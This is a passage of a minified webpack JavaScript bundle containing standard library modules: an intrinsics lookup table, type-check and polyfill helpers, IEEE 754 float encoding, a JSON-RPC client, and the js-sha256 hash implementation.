                        "%Boolean%": Boolean,
                        "%DataView%": "undefined" === typeof DataView ? r : DataView,
                        "%Date%": Date,
                        "%decodeURI%": decodeURI,
                        "%decodeURIComponent%": decodeURIComponent,
                        "%encodeURI%": encodeURI,
                        "%encodeURIComponent%": encodeURIComponent,
                        "%Error%": Error,
                        "%eval%": eval,
                        "%EvalError%": EvalError,
                        "%Float32Array%": "undefined" === typeof Float32Array ? r : Float32Array,
                        "%Float64Array%": "undefined" === typeof Float64Array ? r : Float64Array,
                        "%FinalizationRegistry%": "undefined" === typeof FinalizationRegistry ? r : FinalizationRegistry,
                        "%Function%": o,
                        "%GeneratorFunction%": d,
                        "%Int8Array%": "undefined" === typeof Int8Array ? r : Int8Array,
                        "%Int16Array%": "undefined" === typeof Int16Array ? r : Int16Array,
                        "%Int32Array%": "undefined" === typeof Int32Array ? r : Int32Array,
                        "%isFinite%": isFinite,
                        "%isNaN%": isNaN,
                        "%IteratorPrototype%": f ? h(h([][Symbol.iterator]())) : r,
                        "%JSON%": "object" === typeof JSON ? JSON : r,
                        "%Map%": "undefined" === typeof Map ? r : Map,
                        "%MapIteratorPrototype%": "undefined" !== typeof Map && f ? h((new Map)[Symbol.iterator]()) : r,
                        "%Math%": Math,
                        "%Number%": Number,
                        "%Object%": Object,
                        "%parseFloat%": parseFloat,
                        "%parseInt%": parseInt,
                        "%Promise%": "undefined" === typeof Promise ? r : Promise,
                        "%Proxy%": "undefined" === typeof Proxy ? r : Proxy,
                        "%RangeError%": RangeError,
                        "%ReferenceError%": ReferenceError,
                        "%Reflect%": "undefined" === typeof Reflect ? r : Reflect,
                        "%RegExp%": RegExp,
                        "%Set%": "undefined" === typeof Set ? r : Set,
                        "%SetIteratorPrototype%": "undefined" !== typeof Set && f ? h((new Set)[Symbol.iterator]()) : r,
                        "%SharedArrayBuffer%": "undefined" === typeof SharedArrayBuffer ? r : SharedArrayBuffer,
                        "%String%": String,
                        "%StringIteratorPrototype%": f ? h("" [Symbol.iterator]()) : r,
                        "%Symbol%": f ? Symbol : r,
                        "%SyntaxError%": i,
                        "%ThrowTypeError%": l,
                        "%TypedArray%": p,
                        "%TypeError%": s,
                        "%Uint8Array%": "undefined" === typeof Uint8Array ? r : Uint8Array,
                        "%Uint8ClampedArray%": "undefined" === typeof Uint8ClampedArray ? r : Uint8ClampedArray,
                        "%Uint16Array%": "undefined" === typeof Uint16Array ? r : Uint16Array,
                        "%Uint32Array%": "undefined" === typeof Uint32Array ? r : Uint32Array,
                        "%URIError%": URIError,
                        "%WeakMap%": "undefined" === typeof WeakMap ? r : WeakMap,
                        "%WeakRef%": "undefined" === typeof WeakRef ? r : WeakRef,
                        "%WeakSet%": "undefined" === typeof WeakSet ? r : WeakSet
                    },
                    g = function e(t) {
                        var n;
                        if ("%AsyncFunction%" === t) n = a("async function () {}");
                        else if ("%GeneratorFunction%" === t) n = a("function* () {}");
                        else if ("%AsyncGeneratorFunction%" === t) n = a("async function* () {}");
                        else if ("%AsyncGenerator%" === t) {
                            var r = e("%AsyncGeneratorFunction%");
                            r && (n = r.prototype)
                        } else if ("%AsyncIteratorPrototype%" === t) {
                            var i = e("%AsyncGenerator%");
                            i && (n = h(i.prototype))
                        }
                        return y[t] = n, n
                    },
                    m = {
                        "%ArrayBufferPrototype%": ["ArrayBuffer", "prototype"],
                        "%ArrayPrototype%": ["Array", "prototype"],
                        "%ArrayProto_entries%": ["Array", "prototype", "entries"],
                        "%ArrayProto_forEach%": ["Array", "prototype", "forEach"],
                        "%ArrayProto_keys%": ["Array", "prototype", "keys"],
                        "%ArrayProto_values%": ["Array", "prototype", "values"],
                        "%AsyncFunctionPrototype%": ["AsyncFunction", "prototype"],
                        "%AsyncGenerator%": ["AsyncGeneratorFunction", "prototype"],
                        "%AsyncGeneratorPrototype%": ["AsyncGeneratorFunction", "prototype", "prototype"],
                        "%BooleanPrototype%": ["Boolean", "prototype"],
                        "%DataViewPrototype%": ["DataView", "prototype"],
                        "%DatePrototype%": ["Date", "prototype"],
                        "%ErrorPrototype%": ["Error", "prototype"],
                        "%EvalErrorPrototype%": ["EvalError", "prototype"],
                        "%Float32ArrayPrototype%": ["Float32Array", "prototype"],
                        "%Float64ArrayPrototype%": ["Float64Array", "prototype"],
                        "%FunctionPrototype%": ["Function", "prototype"],
                        "%Generator%": ["GeneratorFunction", "prototype"],
                        "%GeneratorPrototype%": ["GeneratorFunction", "prototype", "prototype"],
                        "%Int8ArrayPrototype%": ["Int8Array", "prototype"],
                        "%Int16ArrayPrototype%": ["Int16Array", "prototype"],
                        "%Int32ArrayPrototype%": ["Int32Array", "prototype"],
                        "%JSONParse%": ["JSON", "parse"],
                        "%JSONStringify%": ["JSON", "stringify"],
                        "%MapPrototype%": ["Map", "prototype"],
                        "%NumberPrototype%": ["Number", "prototype"],
                        "%ObjectPrototype%": ["Object", "prototype"],
                        "%ObjProto_toString%": ["Object", "prototype", "toString"],
                        "%ObjProto_valueOf%": ["Object", "prototype", "valueOf"],
                        "%PromisePrototype%": ["Promise", "prototype"],
                        "%PromiseProto_then%": ["Promise", "prototype", "then"],
                        "%Promise_all%": ["Promise", "all"],
                        "%Promise_reject%": ["Promise", "reject"],
                        "%Promise_resolve%": ["Promise", "resolve"],
                        "%RangeErrorPrototype%": ["RangeError", "prototype"],
                        "%ReferenceErrorPrototype%": ["ReferenceError", "prototype"],
                        "%RegExpPrototype%": ["RegExp", "prototype"],
                        "%SetPrototype%": ["Set", "prototype"],
                        "%SharedArrayBufferPrototype%": ["SharedArrayBuffer", "prototype"],
                        "%StringPrototype%": ["String", "prototype"],
                        "%SymbolPrototype%": ["Symbol", "prototype"],
                        "%SyntaxErrorPrototype%": ["SyntaxError", "prototype"],
                        "%TypedArrayPrototype%": ["TypedArray", "prototype"],
                        "%TypeErrorPrototype%": ["TypeError", "prototype"],
                        "%Uint8ArrayPrototype%": ["Uint8Array", "prototype"],
                        "%Uint8ClampedArrayPrototype%": ["Uint8ClampedArray", "prototype"],
                        "%Uint16ArrayPrototype%": ["Uint16Array", "prototype"],
                        "%Uint32ArrayPrototype%": ["Uint32Array", "prototype"],
                        "%URIErrorPrototype%": ["URIError", "prototype"],
                        "%WeakMapPrototype%": ["WeakMap", "prototype"],
                        "%WeakSetPrototype%": ["WeakSet", "prototype"]
                    },
                    w = n(3350),
                    b = n(8316),
                    v = w.call(Function.call, Array.prototype.concat),
                    A = w.call(Function.apply, Array.prototype.splice),
                    k = w.call(Function.call, String.prototype.replace),
                    _ = w.call(Function.call, String.prototype.slice),
                    E = w.call(Function.call, RegExp.prototype.exec),
                    S = /[^%.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|%$))/g,
                    I = /\\(\\)?/g,
                    x = function(e) {
                        var t = _(e, 0, 1),
                            n = _(e, -1);
                        if ("%" === t && "%" !== n) throw new i("invalid intrinsic syntax, expected closing `%`");
                        if ("%" === n && "%" !== t) throw new i("invalid intrinsic syntax, expected opening `%`");
                        var r = [];
                        return k(e, S, (function(e, t, n, i) {
                            r[r.length] = n ? k(i, I, "$1") : t || e
                        })), r
                    },
                    M = function(e, t) {
                        var n, r = e;
                        if (b(m, r) && (r = "%" + (n = m[r])[0] + "%"), b(y, r)) {
                            var o = y[r];
                            if (o === d && (o = g(r)), "undefined" === typeof o && !t) throw new s("intrinsic " + e + " exists, but is not available. Please file an issue!");
                            return {
                                alias: n,
                                name: r,
                                value: o
                            }
                        }
                        throw new i("intrinsic " + e + " does not exist!")
                    };
                e.exports = function(e, t) {
                    if ("string" !== typeof e || 0 === e.length) throw new s("intrinsic name must be a non-empty string");
                    if (arguments.length > 1 && "boolean" !== typeof t) throw new s('"allowMissing" argument must be a boolean');
                    if (null === E(/^%?[^%]*%?$/g, e)) throw new i("`%` may not be present anywhere but at the beginning and end of the intrinsic name");
                    var n = x(e),
                        r = n.length > 0 ? n[0] : "",
                        o = M("%" + r + "%", t),
                        a = o.name,
                        c = o.value,
                        l = !1,
                        f = o.alias;
                    f && (r = f[0], A(n, v([0, 1], f)));
                    for (var h = 1, d = !0; h < n.length; h += 1) {
                        var p = n[h],
                            g = _(p, 0, 1),
                            m = _(p, -1);
                        if (('"' === g || "'" === g || "`" === g || '"' === m || "'" === m || "`" === m) && g !== m) throw new i("property names with quotes must have matching quotes");
                        if ("constructor" !== p && d || (l = !0), b(y, a = "%" + (r += "." + p) + "%")) c = y[a];
                        else if (null != c) {
                            if (!(p in c)) {
                                if (!t) throw new s("base intrinsic for " + e + " exists, but the property is not available.");
                                return
                            }
                            if (u && h + 1 >= n.length) {
                                var w = u(c, p);
                                c = (d = !!w) && "get" in w && !("originalValue" in w.get) ? w.get : c[p]
                            } else d = b(c, p), c = c[p];
                            d && !l && (y[a] = c)
                        }
                    }
                    return c
                }
            },
            4510: (e, t, n) => {
                "use strict";
                var r = n(2506)("%Object.defineProperty%", !0),
                    i = function() {
                        if (r) try {
                            return r({}, "a", {
                                value: 1
                            }), !0
                        } catch (e) {
                            return !1
                        }
                        return !1
                    };
                i.hasArrayLengthDefineBug = function() {
                    if (!i()) return null;
                    try {
                        return 1 !== r([], "length", {
                            value: 1
                        }).length
                    } catch (e) {
                        return !0
                    }
                }, e.exports = i
            },
            697: (e, t, n) => {
                "use strict";
                var r = "undefined" !== typeof Symbol && Symbol,
                    i = n(3297);
                e.exports = function() {
                    return "function" === typeof r && ("function" === typeof Symbol && ("symbol" === typeof r("foo") && ("symbol" === typeof Symbol("bar") && i())))
                }
            },
            3297: e => {
                "use strict";
                e.exports = function() {
                    if ("function" !== typeof Symbol || "function" !== typeof Object.getOwnPropertySymbols) return !1;
                    if ("symbol" === typeof Symbol.iterator) return !0;
                    var e = {},
                        t = Symbol("test"),
                        n = Object(t);
                    if ("string" === typeof t) return !1;
                    if ("[object Symbol]" !== Object.prototype.toString.call(t)) return !1;
                    if ("[object Symbol]" !== Object.prototype.toString.call(n)) return !1;
                    for (t in e[t] = 42, e) return !1;
                    if ("function" === typeof Object.keys && 0 !== Object.keys(e).length) return !1;
                    if ("function" === typeof Object.getOwnPropertyNames && 0 !== Object.getOwnPropertyNames(e).length) return !1;
                    var r = Object.getOwnPropertySymbols(e);
                    if (1 !== r.length || r[0] !== t) return !1;
                    if (!Object.prototype.propertyIsEnumerable.call(e, t)) return !1;
                    if ("function" === typeof Object.getOwnPropertyDescriptor) {
                        var i = Object.getOwnPropertyDescriptor(e, t);
                        if (42 !== i.value || !0 !== i.enumerable) return !1
                    }
                    return !0
                }
            },
            4707: (e, t, n) => {
                "use strict";
                var r = n(3297);
                e.exports = function() {
                    return r() && !!Symbol.toStringTag
                }
            },
            8316: (e, t, n) => {
                "use strict";
                var r = n(3350);
                e.exports = r.call(Function.call, Object.prototype.hasOwnProperty)
            },
            4038: (e, t) => {
                t.read = function(e, t, n, r, i) {
                    var o, s, a = 8 * i - r - 1,
                        u = (1 << a) - 1,
                        c = u >> 1,
                        l = -7,
                        f = n ? i - 1 : 0,
                        h = n ? -1 : 1,
                        d = e[t + f];
                    for (f += h, o = d & (1 << -l) - 1, d >>= -l, l += a; l > 0; o = 256 * o + e[t + f], f += h, l -= 8);
                    for (s = o & (1 << -l) - 1, o >>= -l, l += r; l > 0; s = 256 * s + e[t + f], f += h, l -= 8);
                    if (0 === o) o = 1 - c;
                    else {
                        if (o === u) return s ? NaN : 1 / 0 * (d ? -1 : 1);
                        s += Math.pow(2, r), o -= c
                    }
                    return (d ? -1 : 1) * s * Math.pow(2, o - r)
                }, t.write = function(e, t, n, r, i, o) {
                    var s, a, u, c = 8 * o - i - 1,
                        l = (1 << c) - 1,
                        f = l >> 1,
                        h = 23 === i ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
                        d = r ? 0 : o - 1,
                        p = r ? 1 : -1,
                        y = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0;
                    for (t = Math.abs(t), isNaN(t) || t === 1 / 0 ? (a = isNaN(t) ? 1 : 0, s = l) : (s = Math.floor(Math.log(t) / Math.LN2), t * (u = Math.pow(2, -s)) < 1 && (s--, u *= 2), (t += s + f >= 1 ? h / u : h * Math.pow(2, 1 - f)) * u >= 2 && (s++, u /= 2), s + f >= l ? (a = 0, s = l) : s + f >= 1 ? (a = (t * u - 1) * Math.pow(2, i), s += f) : (a = t * Math.pow(2, f - 1) * Math.pow(2, i), s = 0)); i >= 8; e[n + d] = 255 & a, d += p, a /= 256, i -= 8);
                    for (s = s << i | a, c += i; c > 0; e[n + d] = 255 & s, d += p, s /= 256, c -= 8);
                    e[n + d - p] |= 128 * y
                }
            },
            2534: e => {
                "function" === typeof Object.create ? e.exports = function(e, t) {
                    t && (e.super_ = t, e.prototype = Object.create(t.prototype, {
                        constructor: {
                            value: e,
                            enumerable: !1,
                            writable: !0,
                            configurable: !0
                        }
                    }))
                } : e.exports = function(e, t) {
                    if (t) {
                        e.super_ = t;
                        var n = function() {};
                        n.prototype = t.prototype, e.prototype = new n, e.prototype.constructor = e
                    }
                }
            },
            5450: (e, t, n) => {
                "use strict";
                var r = n(4707)(),
                    i = n(4037)("Object.prototype.toString"),
                    o = function(e) {
                        return !(r && e && "object" === typeof e && Symbol.toStringTag in e) && "[object Arguments]" === i(e)
                    },
                    s = function(e) {
                        return !!o(e) || null !== e && "object" === typeof e && "number" === typeof e.length && e.length >= 0 && "[object Array]" !== i(e) && "[object Function]" === i(e.callee)
                    },
                    a = function() {
                        return o(arguments)
                    }();
                o.isLegacyArguments = s, e.exports = a ? o : s
            },
            460: e => {
                "use strict";
                var t, n, r = Function.prototype.toString,
                    i = "object" === typeof Reflect && null !== Reflect && Reflect.apply;
                if ("function" === typeof i && "function" === typeof Object.defineProperty) try {
                    t = Object.defineProperty({}, "length", {
                        get: function() {
                            throw n
                        }
                    }), n = {}, i((function() {
                        throw 42
                    }), null, t)
                } catch (l) {
                    l !== n && (i = null)
                } else i = null;
                var o = /^\s*class\b/,
                    s = function(e) {
                        try {
                            var t = r.call(e);
                            return o.test(t)
                        } catch (n) {
                            return !1
                        }
                    },
                    a = Object.prototype.toString,
                    u = "function" === typeof Symbol && !!Symbol.toStringTag,
                    c = "object" === typeof document && "undefined" === typeof document.all && void 0 !== document.all ? document.all : {};
                e.exports = i ? function(e) {
                    if (e === c) return !0;
                    if (!e) return !1;
                    if ("function" !== typeof e && "object" !== typeof e) return !1;
                    if ("function" === typeof e && !e.prototype) return !0;
                    try {
                        i(e, null, t)
                    } catch (r) {
                        if (r !== n) return !1
                    }
                    return !s(e)
                } : function(e) {
                    if (e === c) return !0;
                    if (!e) return !1;
                    if ("function" !== typeof e && "object" !== typeof e) return !1;
                    if ("function" === typeof e && !e.prototype) return !0;
                    if (u) return function(e) {
                        try {
                            return !s(e) && (r.call(e), !0)
                        } catch (t) {
                            return !1
                        }
                    }(e);
                    if (s(e)) return !1;
                    var t = a.call(e);
                    return "[object Function]" === t || "[object GeneratorFunction]" === t
                }
            },
            5718: (e, t, n) => {
                "use strict";
                var r, i = Object.prototype.toString,
                    o = Function.prototype.toString,
                    s = /^\s*(?:function)?\*/,
                    a = n(4707)(),
                    u = Object.getPrototypeOf;
                e.exports = function(e) {
                    if ("function" !== typeof e) return !1;
                    if (s.test(o.call(e))) return !0;
                    if (!a) return "[object GeneratorFunction]" === i.call(e);
                    if (!u) return !1;
                    if ("undefined" === typeof r) {
                        var t = function() {
                            if (!a) return !1;
                            try {
                                return Function("return function*() {}")()
                            } catch (e) {}
                        }();
                        r = !!t && u(t)
                    }
                    return u(e) === r
                }
            },
            6510: e => {
                "use strict";
                e.exports = function(e) {
                    return e !== e
                }
            },
            6188: (e, t, n) => {
                "use strict";
                var r = n(9722),
                    i = n(9396),
                    o = n(6510),
                    s = n(4951),
                    a = n(6034),
                    u = r(s(), Number);
                i(u, {
                    getPolyfill: s,
                    implementation: o,
                    shim: a
                }), e.exports = u
            },
            4951: (e, t, n) => {
                "use strict";
                var r = n(6510);
                e.exports = function() {
                    return Number.isNaN && Number.isNaN(NaN) && !Number.isNaN("a") ? Number.isNaN : r
                }
            },
            6034: (e, t, n) => {
                "use strict";
                var r = n(9396),
                    i = n(4951);
                e.exports = function() {
                    var e = i();
                    return r(Number, {
                        isNaN: e
                    }, {
                        isNaN: function() {
                            return Number.isNaN !== e
                        }
                    }), e
                }
            },
            6218: (e, t, n) => {
                "use strict";
                var r = n(5369),
                    i = n(306),
                    o = n(4037),
                    s = o("Object.prototype.toString"),
                    a = n(4707)(),
                    u = "undefined" === typeof globalThis ? n.g : globalThis,
                    c = i(),
                    l = o("Array.prototype.indexOf", !0) || function(e, t) {
                        for (var n = 0; n < e.length; n += 1)
                            if (e[n] === t) return n;
                        return -1
                    },
                    f = o("String.prototype.slice"),
                    h = {},
                    d = n(636),
                    p = Object.getPrototypeOf;
                a && d && p && r(c, (function(e) {
                    var t = new u[e];
                    if (Symbol.toStringTag in t) {
                        var n = p(t),
                            r = d(n, Symbol.toStringTag);
                        if (!r) {
                            var i = p(n);
                            r = d(i, Symbol.toStringTag)
                        }
                        h[e] = r.get
                    }
                }));
                e.exports = function(e) {
                    if (!e || "object" !== typeof e) return !1;
                    if (!a || !(Symbol.toStringTag in e)) {
                        var t = f(s(e), 8, -1);
                        return l(c, t) > -1
                    }
                    return !!d && function(e) {
                        var t = !1;
                        return r(h, (function(n, r) {
                            if (!t) try {
                                t = n.call(e) === r
                            } catch (i) {}
                        })), t
                    }(e)
                }
            },
            9976: (e, t, n) => {
                "use strict";
                const r = n(3741).v4,
                    i = n(9353),
                    o = function(e, t) {
                        if (!(this instanceof o)) return new o(e, t);
                        t || (t = {}), this.options = {
                            reviver: "undefined" !== typeof t.reviver ? t.reviver : null,
                            replacer: "undefined" !== typeof t.replacer ? t.replacer : null,
                            generator: "undefined" !== typeof t.generator ? t.generator : function() {
                                return r()
                            },
                            version: "undefined" !== typeof t.version ? t.version : 2,
                            notificationIdNull: "boolean" === typeof t.notificationIdNull && t.notificationIdNull
                        }, this.callServer = e
                    };
                e.exports = o, o.prototype.request = function(e, t, n, r) {
                    const o = this;
                    let s = null;
                    const a = Array.isArray(e) && "function" === typeof t;
                    if (1 === this.options.version && a) throw new TypeError("JSON-RPC 1.0 does not support batching");
                    if (a || !a && e && "object" === typeof e && "function" === typeof t) r = t, s = e;
                    else {
                        "function" === typeof n && (r = n, n = void 0);
                        const o = "function" === typeof r;
                        try {
                            s = i(e, t, n, {
                                generator: this.options.generator,
                                version: this.options.version,
                                notificationIdNull: this.options.notificationIdNull
                            })
                        } catch (c) {
                            if (o) return r(c);
                            throw c
                        }
                        if (!o) return s
                    }
                    let u;
                    try {
                        u = JSON.stringify(s, this.options.replacer)
                    } catch (c) {
                        return r(c)
                    }
                    return this.callServer(u, (function(e, t) {
                        o._parseResponse(e, t, r)
                    })), s
                }, o.prototype._parseResponse = function(e, t, n) {
                    if (e) return void n(e);
                    if (!t) return n();
                    let r;
                    try {
                        r = JSON.parse(t, this.options.reviver)
                    } catch (e) {
                        return n(e)
                    }
                    if (3 === n.length) {
                        if (Array.isArray(r)) {
                            const e = function(e) {
                                    return "undefined" !== typeof e.error
                                },
                                t = function(t) {
                                    return !e(t)
                                };
                            return n(null, r.filter(e), r.filter(t))
                        }
                        return n(null, r.error, r.result)
                    }
                    n(null, r)
                }
            },
            9353: (e, t, n) => {
                "use strict";
                const r = n(3741).v4;
                e.exports = function(e, t, n, i) {
                    if ("string" !== typeof e) throw new TypeError(e + " must be a string");
                    const o = "number" === typeof(i = i || {}).version ? i.version : 2;
                    if (1 !== o && 2 !== o) throw new TypeError(o + " must be 1 or 2");
                    const s = {
                        method: e
                    };
                    if (2 === o && (s.jsonrpc = "2.0"), t) {
                        if ("object" !== typeof t && !Array.isArray(t)) throw new TypeError(t + " must be an object, array or omitted");
                        s.params = t
                    }
                    if ("undefined" === typeof n) {
                        const e = "function" === typeof i.generator ? i.generator : function() {
                            return r()
                        };
                        s.id = e(s, i)
                    } else 2 === o && null === n ? i.notificationIdNull && (s.id = null) : s.id = n;
                    return s
                }
            },
            4981: (module, exports, __webpack_require__) => {
                var __WEBPACK_AMD_DEFINE_RESULT__;
                (function() {
                    "use strict";
                    var ERROR = "input is invalid type",
                        WINDOW = "object" === typeof window,
                        root = WINDOW ? window : {};
                    root.JS_SHA256_NO_WINDOW && (WINDOW = !1);
                    var WEB_WORKER = !WINDOW && "object" === typeof self,
                        NODE_JS = !root.JS_SHA256_NO_NODE_JS && "object" === typeof process && process.versions && process.versions.node;
                    NODE_JS ? root = __webpack_require__.g : WEB_WORKER && (root = self);
                    var COMMON_JS = !root.JS_SHA256_NO_COMMON_JS && module.exports,
                        AMD = __webpack_require__.amdO,
                        ARRAY_BUFFER = !root.JS_SHA256_NO_ARRAY_BUFFER && "undefined" !== typeof ArrayBuffer,
                        HEX_CHARS = "0123456789abcdef".split(""),
                        EXTRA = [-2147483648, 8388608, 32768, 128],
                        SHIFT = [24, 16, 8, 0],
                        K = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
                        OUTPUT_TYPES = ["hex", "array", "digest", "arrayBuffer"],
                        blocks = [];
                    !root.JS_SHA256_NO_NODE_JS && Array.isArray || (Array.isArray = function(e) {
                        return "[object Array]" === Object.prototype.toString.call(e)
                    }), !ARRAY_BUFFER || !root.JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW && ArrayBuffer.isView || (ArrayBuffer.isView = function(e) {
                        return "object" === typeof e && e.buffer && e.buffer.constructor === ArrayBuffer
                    });
                    var createOutputMethod = function(e, t) {
                            return function(n) {
                                return new Sha256(t, !0).update(n)[e]()
                            }
                        },
                        createMethod = function(e) {
                            var t = createOutputMethod("hex", e);
                            NODE_JS && (t = nodeWrap(t, e)), t.create = function() {
                                return new Sha256(e)
                            }, t.update = function(e) {
                                return t.create().update(e)
                            };
                            for (var n = 0; n < OUTPUT_TYPES.length; ++n) {
                                var r = OUTPUT_TYPES[n];
                                t[r] = createOutputMethod(r, e)
                            }
                            return t
                        },
                        nodeWrap = function(method, is224) {
                            var crypto = eval("require('crypto')"),
                                Buffer = eval("require('buffer').Buffer"),
                                algorithm = is224 ? "sha224" : "sha256",
                                nodeMethod = function(e) {
                                    if ("string" === typeof e) return crypto.createHash(algorithm).update(e, "utf8").digest("hex");
                                    if (null === e || void 0 === e) throw new Error(ERROR);
                                    return e.constructor === ArrayBuffer && (e = new Uint8Array(e)), Array.isArray(e) || ArrayBuffer.isView(e) || e.constructor === Buffer ? crypto.createHash(algorithm).update(new Buffer(e)).digest("hex") : method(e)
                                };
                            return nodeMethod
                        },
                        createHmacOutputMethod = function(e, t) {
                            return function(n, r) {
                                return new HmacSha256(n, t, !0).update(r)[e]()
                            }
                        },
                        createHmacMethod = function(e) {
                            var t = createHmacOutputMethod("hex", e);
                            t.create = function(t) {
                                return new HmacSha256(t, e)
                            }, t.update = function(e, n) {
                                return t.create(e).update(n)
                            };
                            for (var n = 0; n < OUTPUT_TYPES.length; ++n) {
                                var r = OUTPUT_TYPES[n];
                                t[r] = createHmacOutputMethod(r, e)
                            }
                            return t
                        };

                    function Sha256(e, t) {
                        t ? (blocks[0] = blocks[16] = blocks[1] = blocks[2] = blocks[3] = blocks[4] = blocks[5] = blocks[6] = blocks[7] = blocks[8] = blocks[9] = blocks[10] = blocks[11] = blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0, this.blocks = blocks) : this.blocks = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], e ? (this.h0 = 3238371032, this.h1 = 914150663, this.h2 = 812702999, this.h3 = 4144912697, this.h4 = 4290775857, this.h5 = 1750603025, this.h6 = 1694076839, this.h7 = 3204075428) : (this.h0 = 1779033703, this.h1 = 3144134277, this.h2 = 1013904242, this.h3 = 2773480762, this.h4 = 1359893119, this.h5 = 2600822924, this.h6 = 528734635, this.h7 = 1541459225), this.block = this.start = this.bytes = this.hBytes = 0, this.finalized = this.hashed = !1, this.first = !0, this.is224 = e
                    }

                    function HmacSha256(e, t, n) {
                        var r, i = typeof e;
                        if ("string" === i) {
                            var o, s = [],
                                a = e.length,
                                u = 0;
                            for (r = 0; r < a; ++r)(o = e.charCodeAt(r)) < 128 ? s[u++] = o : o < 2048 ? (s[u++] = 192 | o >> 6, s[u++] = 128 | 63 & o) : o < 55296 || o >= 57344 ? (s[u++] = 224 | o >> 12, s[u++] = 128 | o >> 6 & 63, s[u++] = 128 | 63 & o) : (o = 65536 + ((1023 & o) << 10 | 1023 & e.charCodeAt(++r)), s[u++] = 240 | o >> 18, s[u++] = 128 | o >> 12 & 63, s[u++] = 128 | o >> 6 & 63, s[u++] = 128 | 63 & o);
                            e = s
                        } else {
                            if ("object" !== i) throw new Error(ERROR);
                            if (null === e) throw new Error(ERROR);
                            if (ARRAY_BUFFER && e.constructor === ArrayBuffer) e = new Uint8Array(e);
                            else if (!Array.isArray(e) && (!ARRAY_BUFFER || !ArrayBuffer.isView(e))) throw new Error(ERROR)
                        }
                        e.length > 64 && (e = new Sha256(t, !0).update(e).array());
                        var c = [],
                            l = [];
                        for (r = 0; r < 64; ++r) {
                            var f = e[r] || 0;
                            c[r] = 92 ^ f, l[r] = 54 ^ f
                        }
                        Sha256.call(this, t, n), this.update(l), this.oKeyPad = c, this.inner = !0, this.sharedMemory = n
                    }
                    Sha256.prototype.update = function(e) {
                        if (!this.finalized) {
                            var t, n = typeof e;
                            if ("string" !== n) {
                                if ("object" !== n) throw new Error(ERROR);
                                if (null === e) throw new Error(ERROR);
                                if (ARRAY_BUFFER && e.constructor === ArrayBuffer) e = new Uint8Array(e);
                                else if (!Array.isArray(e) && (!ARRAY_BUFFER || !ArrayBuffer.isView(e))) throw new Error(ERROR);
                                t = !0
                            }
                            for (var r, i, o = 0, s = e.length, a = this.blocks; o < s;) {
                                if (this.hashed && (this.hashed = !1, a[0] = this.block, a[16] = a[1] = a[2] = a[3] = a[4] = a[5] = a[6] = a[7] = a[8] = a[9] = a[10] = a[11] = a[12] = a[13] = a[14] = a[15] = 0), t)
                                    for (i = this.start; o < s && i < 64; ++o) a[i >> 2] |= e[o] << SHIFT[3 & i++];
                                else
                                    for (i = this.start; o < s && i < 64; ++o)(r = e.charCodeAt(o)) < 128 ? a[i >> 2] |= r << SHIFT[3 & i++] : r < 2048 ? (a[i >> 2] |= (192 | r >> 6) << SHIFT[3 & i++], a[i >> 2] |= (128 | 63 & r) << SHIFT[3 & i++]) : r < 55296 || r >= 57344 ? (a[i >> 2] |= (224 | r >> 12) << SHIFT[3 & i++], a[i >> 2] |= (128 | r >> 6 & 63) << SHIFT[3 & i++], a[i >> 2] |= (128 | 63 & r) << SHIFT[3 & i++]) : (r = 65536 + ((1023 & r) << 10 | 1023 & e.charCodeAt(++o)), a[i >> 2] |= (240 | r >> 18) << SHIFT[3 & i++], a[i >> 2] |= (128 | r >> 12 & 63) << SHIFT[3 & i++], a[i >> 2] |= (128 | r >> 6 & 63) << SHIFT[3 & i++], a[i >> 2] |= (128 | 63 & r) << SHIFT[3 & i++]);
                                this.lastByteIndex = i, this.bytes += i - this.start, i >= 64 ? (this.block = a[16], this.start = i - 64, this.hash(), this.hashed = !0) : this.start = i
                            }
                            return this.bytes > 4294967295 && (this.hBytes += this.bytes / 4294967296 << 0, this.bytes = this.bytes % 4294967296), this
                        }
                    }, Sha256.prototype.finalize = function() {
                        if (!this.finalized) {
                            this.finalized = !0;
                            var e = this.blocks,
                                t = this.lastByteIndex;
                            e[16] = this.block, e[t >> 2] |= EXTRA[3 & t], this.block = e[16], t >= 56 && (this.hashed || this.hash(), e[0] = this.block, e[16] = e[1] = e[2] = e[3] = e[4] = e[5] = e[6] = e[7] = e[8] = e[9] = e[10] = e[11] = e[12] = e[13] = e[14] = e[15] = 0), e[14] = this.hBytes << 3 | this.bytes >>> 29, e[15] = this.bytes << 3, this.hash()
                        }
                    }, Sha256.prototype.hash = function() {
                        var e, t, n, r, i, o, s, a, u, c = this.h0,
                            l = this.h1,
                            f = this.h2,
                            h = this.h3,
                            d = this.h4,
                            p = this.h5,
                            y = this.h6,
                            g = this.h7,
                            m = this.blocks;
                        for (e = 16; e < 64; ++e) t = ((i = m[e - 15]) >>> 7 | i << 25) ^ (i >>> 18 | i << 14) ^ i >>> 3, n = ((i = m[e - 2]) >>> 17 | i << 15) ^ (i >>> 19 | i << 13) ^ i >>> 10, m[e] = m[e - 16] + t + m[e - 7] + n << 0;
